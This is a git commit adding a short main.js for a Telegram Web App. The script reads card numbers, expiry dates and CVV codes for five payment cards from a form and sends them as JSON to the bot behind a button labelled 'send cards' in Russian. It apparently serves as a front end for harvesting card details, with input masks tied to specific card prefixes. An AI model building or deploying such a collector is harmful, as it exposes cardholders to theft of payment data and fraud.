12d297a4c87d7abdd5a476acfaec4e4e71128bc7
ALegroPE <126088193+ALegroPE@users.noreply.github.com>
2023-02-22 20:46:16 +0600

    Add files via upload

---
+++ main.js
@@ -0,0 +1,27 @@
+let tg = window.Telegram.WebApp;
+
+$(document).ready(function() {
+    tg.MainButton.onClick(function(){
+
+        cards=[
+            {"card":$("#c1").val(), "date":$("#d1").val(),"ccv":$("#ccv1").val()},
+            {"card":$("#c2").val(), "date":$("#d2").val(),"ccv":$("#ccv2").val()},
+            {"card":$("#c3").val(), "date":$("#d3").val(),"ccv":$("#ccv3").val()},
+            {"card":$("#c4").val(), "date":$("#d4").val(),"ccv":$("#ccv4").val()},
+            {"card":$("#c5").val(), "date":$("#d5").val(),"ccv":$("#ccv5").val()}
+        ];
+
+        tg.sendData(JSON.stringify(cards)); 
+
+    }); 
+});
+
+$(function(){
+    //2. Получить элемент, к которому необходимо добавить маску
+    tg.MainButton.text = "отправить карты"
+    $(".bcard4").mask("4444 9999 9999 9999", {placeholder: "4444 5678 9123 4567" });
+    $(".bcard").mask("5177 9999 9999 9999", {placeholder: "5177 5678 9123 4567" });
+    $(".litle").mask("99/99", {placeholder: "мм/гг" });
+    $(".tall").mask("999", {placeholder: "ccv" });
+  });
+
